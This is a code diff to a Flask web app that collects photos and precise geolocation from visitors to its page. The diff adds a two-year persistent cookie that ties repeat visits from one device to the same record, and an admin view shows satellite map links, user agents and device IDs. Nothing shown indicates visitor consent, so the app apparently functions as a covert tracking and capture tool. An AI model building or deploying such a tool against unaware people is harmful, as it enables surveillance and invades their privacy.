@@ -6,11 +6,12 @@ from flask import (
     redirect,
     url_for,
     session,
-    send_file
+    send_file,
+    make_response
 )
 
 from uuid import uuid4
-from datetime import datetime, timezone
+from datetime import datetime, timezone, timedelta
 from functools import wraps
 from io import BytesIO
 import os
@@ -20,6 +21,7 @@ from werkzeug.security import check_password_hash
 from supabase_db import (
     create_capture,
     get_capture,
+    get_capture_by_device,
     get_all_captures,
     create_location,
     get_locations,
@@ -50,18 +52,21 @@ SECRET_KEY = os.environ.get(
 
 
 if not ADMIN_USERNAME:
+
     raise RuntimeError(
         "Variável ADMIN_USERNAME não configurada."
     )
 
 
 if not ADMIN_PASSWORD_HASH:
+
     raise RuntimeError(
         "Variável ADMIN_PASSWORD_HASH não configurada."
     )
 
 
 if not SECRET_KEY:
+
     raise RuntimeError(
         "Variável SECRET_KEY não configurada."
     )
@@ -89,6 +94,15 @@ app.config.update(
 
 
 # ============================================================
+# CONSTANTES
+# ============================================================
+
+DEVICE_COOKIE_NAME = "sentinela_device"
+
+DEVICE_COOKIE_MAX_AGE = 60 * 60 * 24 * 365 * 2
+
+
+# ============================================================
 # FUNÇÕES AUXILIARES
 # ============================================================
 
@@ -97,30 +111,6 @@ def now_utc():
     return datetime.now(
         timezone.utc
     ).isoformat()
-
-
-def ensure_capture(
-    capture_id,
-    user_agent=""
-):
-
-    if not capture_id:
-        return False
-
-    existing = get_capture(
-        capture_id
-    )
-
-    if existing:
-        return True
-
-    create_capture(
-        capture_id=capture_id,
-        created_at=now_utc(),
-        user_agent=user_agent
-    )
-
-    return True
 
 
 def make_maps_url(
@@ -132,6 +122,184 @@ def make_maps_url(
         "https://www.google.com/maps"
         f"?z=20&t=k"
         f"&q=loc:{latitude}+{longitude}"
+    )
+
+
+# ============================================================
+# IDENTIFICAÇÃO DO DISPOSITIVO
+# ============================================================
+
+def get_device_id():
+
+    return request.cookies.get(
+        DEVICE_COOKIE_NAME
+    )
+
+
+def create_device_id():
+
+    return uuid4().hex
+
+
+def get_or_create_device_capture():
+
+    """
+    Retorna a captura associada ao navegador/dispositivo.
+
+    Se já existir um device_id no cookie e houver uma captura
+    associada a ele, reutiliza essa captura.
+
+    Caso contrário, cria uma nova captura.
+    """
+
+    device_id = get_device_id()
+
+
+    # --------------------------------------------------------
+    # CASO 1 — dispositivo já possui cookie
+    # --------------------------------------------------------
+
+    if device_id:
+
+        existing_capture = (
+            get_capture_by_device(
+                device_id
+            )
+        )
+
+
+        if existing_capture:
+
+            return (
+                device_id,
+                existing_capture,
+                False
+            )
+
+
+    # --------------------------------------------------------
+    # CASO 2 — novo dispositivo
+    # --------------------------------------------------------
+
+    device_id = create_device_id()
+
+    capture_id = uuid4().hex
+
+
+    capture = create_capture(
+
+        capture_id=capture_id,
+
+        created_at=now_utc(),
+
+        user_agent=request.headers.get(
+            "User-Agent",
+            ""
+        ),
+
+        device_id=device_id
+
+    )
+
+
+    return (
+        device_id,
+        capture,
+        True
+    )
+
+
+# ============================================================
+# GARANTIR CAPTURA
+# ============================================================
+
+def ensure_capture(
+    capture_id,
+    user_agent="",
+    device_id=None
+):
+
+    if not capture_id:
+
+        return False
+
+
+    existing = get_capture(
+        capture_id
+    )
+
+
+    if existing:
+
+        return True
+
+
+    create_capture(
+
+        capture_id=capture_id,
+
+        created_at=now_utc(),
+
+        user_agent=user_agent,
+
+        device_id=device_id
+
+    )
+
+
+    return True
+
+
+# ============================================================
+# RESOLVER CAPTURA DO DISPOSITIVO
+# ============================================================
+
+def resolve_capture_id(
+    requested_capture_id=None
+):
+
+    device_id = get_device_id()
+
+
+    # --------------------------------------------------------
+    # Se existe dispositivo conhecido, ele tem prioridade
+    # --------------------------------------------------------
+
+    if device_id:
+
+        existing_capture = (
+            get_capture_by_device(
+                device_id
+            )
+        )
+
+
+        if existing_capture:
+
+            return (
+                existing_capture[
+                    "capture_id"
+                ],
+                device_id
+            )
+
+
+    # --------------------------------------------------------
+    # Não existe captura conhecida
+    # --------------------------------------------------------
+
+    if requested_capture_id:
+
+        capture_id = requested_capture_id
+
+    else:
+
+        capture_id = uuid4().hex
+
+
+    return (
+        capture_id,
+        device_id
     )
 
 
@@ -301,9 +469,173 @@ def logout():
 @app.route("/")
 def index():
 
-    return render_template(
-        "index.html"
+    device_id = get_device_id()
+
+
+    # --------------------------------------------------------
+    # Já existe dispositivo conhecido?
+    # --------------------------------------------------------
+
+    existing_capture = None
+
+
+    if device_id:
+
+        existing_capture = (
+            get_capture_by_device(
+                device_id
+            )
+        )
+
+
+    # --------------------------------------------------------
+    # Se não existe, cria
+    # --------------------------------------------------------
+
+    if not existing_capture:
+
+        (
+            device_id,
+            existing_capture,
+            is_new
+        ) = get_or_create_device_capture()
+
+
+    capture_id = (
+        existing_capture[
+            "capture_id"
+        ]
     )
+
+
+    response = make_response(
+
+        render_template(
+
+            "index.html",
+
+            capture_id=capture_id
+
+        )
+
+    )
+
+
+    # --------------------------------------------------------
+    # Garante cookie permanente
+    # --------------------------------------------------------
+
+    response.set_cookie(
+
+        DEVICE_COOKIE_NAME,
+
+        device_id,
+
+        max_age=DEVICE_COOKIE_MAX_AGE,
+
+        secure=True,
+
+        httponly=True,
+
+        samesite="Lax"
+
+    )
+
+
+    return response
+
+
+# ============================================================
+# API — SESSÃO DO DISPOSITIVO
+# ============================================================
+
+@app.get("/api/session")
+def api_session():
+
+    try:
+
+        device_id = get_device_id()
+
+
+        existing_capture = None
+
+
+        if device_id:
+
+            existing_capture = (
+                get_capture_by_device(
+                    device_id
+                )
+            )
+
+
+        if existing_capture:
+
+            capture_id = (
+                existing_capture[
+                    "capture_id"
+                ]
+            )
+
+        else:
+
+            (
+                device_id,
+                existing_capture,
+                is_new
+            ) = get_or_create_device_capture()
+
+
+            capture_id = (
+                existing_capture[
+                    "capture_id"
+                ]
+            )
+
+
+        response = make_response(
+
+            jsonify({
+
+                "success": True,
+
+                "capture_id":
+                    capture_id
+
+            })
+
+        )
+
+
+        response.set_cookie(
+
+            DEVICE_COOKIE_NAME,
+
+            device_id,
+
+            max_age=DEVICE_COOKIE_MAX_AGE,
+
+            secure=True,
+
+            httponly=True,
+
+            samesite="Lax"
+
+        )
+
+
+        return response
+
+
+    except Exception as e:
+
+        return jsonify({
+
+            "success": False,
+
+            "error": str(e)
+
+        }), 500
 
 
 # ============================================================
@@ -331,8 +663,10 @@ def upload():
     )
 
 
-    capture_id = request.form.get(
-        "capture_id"
+    requested_capture_id = (
+        request.form.get(
+            "capture_id"
+        )
     )
 
 
@@ -353,19 +687,21 @@ def upload():
         }), 400
 
 
-    if not capture_id:
-
-        return jsonify({
-
-            "success": False,
-
-            "error":
-                "capture_id ausente"
-
-        }), 400
-
-
     try:
+
+        # ----------------------------------------------------
+        # Resolve captura pelo dispositivo
+        # ----------------------------------------------------
+
+        (
+            capture_id,
+            device_id
+        ) = resolve_capture_id(
+
+            requested_capture_id
+
+        )
+
 
         ensure_capture(
 
@@ -374,10 +710,16 @@ def upload():
             request.headers.get(
                 "User-Agent",
                 ""
-            )
+            ),
+
+            device_id
 
         )
 
+
+        # ----------------------------------------------------
+        # Arquivo
+        # ----------------------------------------------------
 
         filename = (
             f"{uuid4().hex}.jpg"
@@ -394,13 +736,21 @@ def upload():
             filename=filename,
 
             content_type=(
+
                 photo.content_type
+
                 or
+
                 "image/jpeg"
+
             )
 
         )
 
+
+        # ----------------------------------------------------
+        # Location ID
+        # ----------------------------------------------------
 
         location_id_value = None
 
@@ -421,8 +771,9 @@ def upload():
                 location_id_value = None
 
 
-        created_at = now_utc()
-
+        # ----------------------------------------------------
+        # Registro
+        # ----------------------------------------------------
 
         photo_record = create_photo(
 
@@ -432,7 +783,7 @@ def upload():
 
             filename=filename,
 
-            created_at=created_at
+            created_at=now_utc()
 
         )
 
@@ -487,8 +838,10 @@ def location():
         }), 400
 
 
-    capture_id = data.get(
-        "capture_id"
+    requested_capture_id = (
+        data.get(
+            "capture_id"
+        )
     )
 
 
@@ -505,18 +858,6 @@ def location():
     accuracy = data.get(
         "accuracy"
     )
-
-
-    if not capture_id:
-
-        return jsonify({
-
-            "success": False,
-
-            "error":
-                "capture_id ausente"
-
-        }), 400
 
 
     if (
@@ -570,6 +911,20 @@ def location():
 
     try:
 
+        # ----------------------------------------------------
+        # Resolve captura pelo dispositivo
+        # ----------------------------------------------------
+
+        (
+            capture_id,
+            device_id
+        ) = resolve_capture_id(
+
+            requested_capture_id
+
+        )
+
+
         ensure_capture(
 
             capture_id,
@@ -577,10 +932,16 @@ def location():
             request.headers.get(
                 "User-Agent",
                 ""
-            )
+            ),
+
+            device_id
 
         )
 
+
+        # ----------------------------------------------------
+        # Salva localização
+        # ----------------------------------------------------
 
         location_record = create_location(
 
@@ -623,8 +984,11 @@ def location():
 
             "maps_url":
                 make_maps_url(
+
                     latitude,
+
                     longitude
+
                 )
 
         })
@@ -686,6 +1050,11 @@ def api_captures():
                 "user_agent":
                     row.get(
                         "user_agent"
+                    ),
+
+                "device_id":
+                    row.get(
+                        "device_id"
                     ),
 
                 "location_count":
@@ -783,6 +1152,11 @@ def api_capture(
             "user_agent":
                 capture.get(
                     "user_agent"
+                ),
+
+            "device_id":
+                capture.get(
+                    "device_id"
                 )
 
         }
@@ -795,6 +1169,7 @@ def api_capture(
                     "latitude"
                 ]
             )
+
 
             longitude = (
                 last_location[
@@ -818,8 +1193,11 @@ def api_capture(
 
                 "maps_url":
                     make_maps_url(
+
                         latitude,
+
                         longitude
+
                     )
 
             })
@@ -880,9 +1258,11 @@ def api_capture(
 
             location = (
                 get_photo_location(
+
                     row.get(
                         "location_id"
                     )
+
                 )
             )
 
@@ -905,40 +1285,58 @@ def api_capture(
 
                 "photo_url":
                     url_for(
+
                         "uploaded_file",
+
                         filename=row[
                             "filename"
                         ]
+
                     ),
 
                 "created_at":
                     row["created_at"],
 
                 "latitude":
+
                     (
+
                         location[
                             "latitude"
                         ]
+
                         if location
+
                         else None
+
                     ),
 
                 "longitude":
+
                     (
+
                         location[
                             "longitude"
                         ]
+
                         if location
+
                         else None
+
                     ),
 
                 "accuracy":
+
                     (
+
                         location[
                             "accuracy"
                         ]
+
                         if location
+
                         else None
+
                     )
 
             })
@@ -1112,10 +1510,15 @@ def uploaded_file(
 if __name__ == "__main__":
 
     port = int(
+
         os.environ.get(
+
             "PORT",
+
             5000
+
         )
+
     )
 
 
